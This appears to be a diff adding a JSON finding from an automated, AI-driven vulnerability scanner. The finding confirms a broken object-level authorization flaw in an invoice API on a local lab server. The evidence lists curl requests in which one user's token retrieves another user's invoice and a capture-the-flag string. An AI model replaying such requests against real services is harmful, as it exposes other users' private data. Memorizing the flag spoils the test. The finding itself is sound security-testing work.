@@ -1,0 +1,64 @@
+{
+  "finding": {
+    "confidence": "earned (live proof)",
+    "cwe": "CWE-639",
+    "endpoint": "GET /api/invoices/{invoice_id}",
+    "evidence": {
+      "assertion": "user_A authenticated, received invoice 2 owned by user_B, flag recovered -> BOLA confirmed",
+      "attacker_user": "user_A",
+      "backend": "subprocess",
+      "exchanges": [
+        {
+          "request": "$ curl -H 'Authorization: Bearer tok_alice_a1' http://127.0.0.1:61679/api/invoices/1\n",
+          "response_body": "{\"id\":1,\"owner_id\":\"user_A\",\"customer\":\"Acme Corp\",\"amount\":1200,\"note\":\"Q3 retainer\"}",
+          "response_status": 200
+        },
+        {
+          "request": "$ curl -H 'Authorization: Bearer tok_alice_a1' http://127.0.0.1:61679/api/invoices/2\n",
+          "response_body": "{\"id\":2,\"owner_id\":\"user_B\",\"customer\":\"Globex Inc\",\"amount\":9000,\"note\":\"FLAG{bola_user_b_invoice_pwned}\"}",
+          "response_status": 200
+        },
+        {
+          "request": "$ curl -H 'Authorization: Bearer tok_alice_a1' http://127.0.0.1:61679/api/me/invoices\n",
+          "response_body": "[{\"id\":1,\"owner_id\":\"user_A\",\"customer\":\"Acme Corp\",\"amount\":1200,\"note\":\"Q3 retainer\"}]",
+          "response_status": 200
+        }
+      ],
+      "exploit_reproduced": true,
+      "flag": "FLAG{bola_user_b_invoice_pwned}",
+      "victim_user": "user_B"
+    },
+    "hypothesis": "The endpoint authenticates the caller but the handler returns an object fetched by id with no check that it belongs to the caller. An authenticated user can read another tenant's object.",
+    "path": {
+      "endpoint": "GET /api/invoices/{invoice_id}",
+      "object_param": "invoice_id",
+      "reason": "attacker-controlled path param reaches a DB read with authentication but NO ownership check \u2014 the returned object can belong to another user (BOLA / CWE-639)",
+      "sink": "sink:get_invoice:91",
+      "source": "source:get_invoice:invoice_id"
+    },
+    "severity": "High",
+    "status": "VERIFIED",
+    "title": "Broken Object Level Authorization in invoice retrieval"
+  },
+  "ledger": {
+    "completion_tokens": 420,
+    "cost_usd": 0.0,
+    "model": "qwen2.5-coder:32b",
+    "prompt_tokens": 1800,
+    "wall_seconds": 0.9
+  },
+  "log": [
+    {
+      "detail": "1 unguarded candidate(s)",
+      "node": "context_builder"
+    },
+    {
+      "detail": "attempt 0: target=GET /api/invoices/{invoice_id} gate_ok=True",
+      "node": "hypothesis"
+    },
+    {
+      "detail": "VERIFIED",
+      "node": "validator"
+    }
+  ]
+}
